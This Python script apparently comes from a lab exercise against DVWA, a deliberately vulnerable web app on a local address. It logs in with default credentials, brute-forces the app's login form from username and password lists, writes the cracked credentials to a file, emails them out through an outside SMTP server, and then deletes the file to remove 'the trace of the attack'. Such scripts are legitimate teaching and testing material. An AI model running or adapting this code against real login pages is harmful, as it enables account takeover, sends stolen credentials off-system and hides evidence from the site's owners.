#Importing required libraries to interact with the target site and to use smtp
import mechanicalsoup
import os
import smtplib
import time
import maskpass

#Importing dotenv module
from dotenv import load_dotenv

#To find a dotenv and load the environment variables into the script
load_dotenv()

#Using MIME functionality to attach the generated result text file to mail
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


#Specifying the target site and creating an instance of StatefulBrowser to interact with the site
target_site = "http://192.168.120.129/dvwa/login.php"
browser = mechanicalsoup.StatefulBrowser()
browser.open(target_site)
print(browser.get_url())

#Entering into login page and filling out neccesary field by mentioning the form action
browser.select_form('form[action="login.php"]')
browser["username"]="admin"
browser["password"]="password"
browser.submit_selected()
print(browser.get_url())

#Entering into bruteforce attack page and providing payloads for username and password
browser.follow_link("vulnerabilities/brute/")
username_list = ["test","root","admin"]
password_list = ["abc","123","password","pass","xyz"]


#Defining a brute_force attack function 
def brute_force():
            
    for username in username_list:
        browser.follow_link("vulnerabilities/brute/")
        for password in password_list:
            browser.select_form('form[action="#"]')
            browser["username"]=username
            browser["password"]=password
            response = browser.submit_selected()
            if "Welcome to the password protected area" in response.text:
                #Creating two global variables to store the attacked username and password
                global brute_login_username
                brute_login_username = username

                global brute_login_password
                brute_login_password = password
                break
            else:
                browser.follow_link("vulnerabilities/brute/")
                  	
#Defining the function to generate a text file having the attacked username and password
#  
#Mailing the generated text file
def result_mail():

    # generating a text file to store the attacked username and password
    result = open("attackresult.txt",'w')
    result.write("Username:"+brute_login_username + "\n")
    result.write("Password:"+brute_login_password)
    result.close()

    # getting the from-address from .env file
    fromaddr = os.getenv('FROMADDR')

    # installing maskpass module to mask the To-address,password entered by the user
    toaddr = input("Enter To-address: ") 
    pwd = maskpass.askpass(prompt="Enter password: ",mask="#")

    

    # instance of MIMEMultipart
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = fromaddr

    # storing the receivers email address
    msg['To'] = toaddr

    # storing the subject
    msg['Subject'] = f"[REPORT] {target_site}"

    # string to store the body of the mail
    body = f"The report for site {target_site} is attached on this mail"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = "attackresult.txt"
    attachment = open("attackresult.txt", "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.mail.yahoo.com', 587)

    # creating connection before login and sendemail
    # s.connect("smtp.mail.yahoo.com",587)

    # start TLS for security
    s.starttls() 

    # Logging into the senders mail account
    s.login(fromaddr,pwd) 

    
    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    # terminating the session
    s.quit()

    # closing the attackresult.txt file so that it can't be removed from the system
    attachment.close()

    #Removing the trace of the attack
    os.remove('attackresult.txt')

    #Printing the confirmation
    print("Mail sent")

    time.sleep(3)


if __name__ == "__main__":
    brute_force()
    result_mail()




